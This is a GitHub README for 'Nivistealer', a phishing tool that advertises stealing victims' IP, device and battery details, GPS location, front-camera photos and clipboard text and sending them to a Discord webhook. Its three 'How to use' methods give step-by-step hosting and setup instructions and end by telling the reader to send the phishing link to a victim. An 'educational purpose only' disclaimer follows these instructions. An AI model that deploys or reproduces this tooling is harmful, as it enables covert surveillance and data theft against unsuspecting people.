<p align="center">
      <img src="https://wallpapercave.com/uwp/uwp757693.gif" height="250px" width="300px" ></img>
      <br><br>
      Nivistealer coded by : swagkarna
 </p>
 
 ---
 * **If you like the tool and for my personal motivation so as to develop other tools please  leave a +1 star** 
  ---
 ## Features of Nivi-Stealer:
 - Steal Victim Ip
 - Steal Device Info
 - Steal Network and Battery Info
 - Uses  Device Gps  to steal exact location
 - Steal pic from front camera
 - Steal text from victim clipboard (added recently) 
 - Send logs to discord also save them locally in a txt file
 - Works on android,windows,linux,mac os
 - Uses iframe to load live website to make phishing attack more reliable
 ---
 
 ## How to use?
 
<p>
      <b>Method 0 :</b></p>

  [![Run on Repl.it](https://repl.it/badge/github/swagkarna/Nivistealer)](https://repl.it/github/swagkarna/Nivistealer)

- Click the above button  or [click here](https://repl.it/github/swagkarna/Nivistealer) to run on `repl.it`
- Login/Signup on [repl.it](https://repl.it)
- After it clones the repo edit <a href="https://github.com/swagkarna/Nivistealer/blob/bfb77519443a90613fab8f55c1a534b8918c5345/python_flask/index.html#L185">this</a> line with your repl url
- Now click Run
---
 <p>
      <b>Method 1 :</b></p>
            
- Clone or Download this repo
- Create a account on any webhosting site that provide ssl . I suggest a free webhosting site called ```000webhost.com```
- Now upload ```index.html,sunni.php,post.php``` on your webhosting site
- Now open index.html and replace <A href="https://github.com/swagkarna/Nivistealer/blob/cd447284a17844d019fa116f2cd5665de9bd1c6b/index.html#L80">this</a> with your ```discord webhook url```  
- Boom !!! . Now send the phishing link to your victim . Logs will be send to your discord webhook and also saved to ```sensitiveinfo.txt``` file      
      
---       
<p>
      <b>Method 2 :</b></p>
      
- Clone the repo and navigate to ```python_flask``` directory      
- open your terminal and type ```pip3 install colorama``` ```pip3 install flask```
- Now edit <a href="https://github.com/swagkarna/Nivistealer/blob/cd447284a17844d019fa116f2cd5665de9bd1c6b/python_flask/index.html#L142">this</a> line with your url
- Now type ```python nivistealer.py```   Boom !!! 
- Images and log file will be saved locally on your directory   
---  


## *Nivistealer in action*[Method 2] :
https://user-images.githubusercontent.com/46685308/156226849-ccce8ade-552a-49bd-be93-eb14aaed8971.mp4

---
### Discalimer :
#### Use this only for educational Purpose....  I am not responsible for your action...Love you Guys.. Stay safe !!! Stay legal !!!
---

### ❤️Supporters❤️
[![Stargazers repo roster for @swagkarna/Nivistealer](https://reporoster.com/stars/swagkarna/Nivistealer)](https://github.com/swagkarna/Nivistealer/stargazers)

[![Forkers repo roster for @swagkarna/Nivistealer](https://reporoster.com/forks/swagkarna/Nivistealer)](https://github.com/swagkarna/Nivistealer/network/members)

---
     
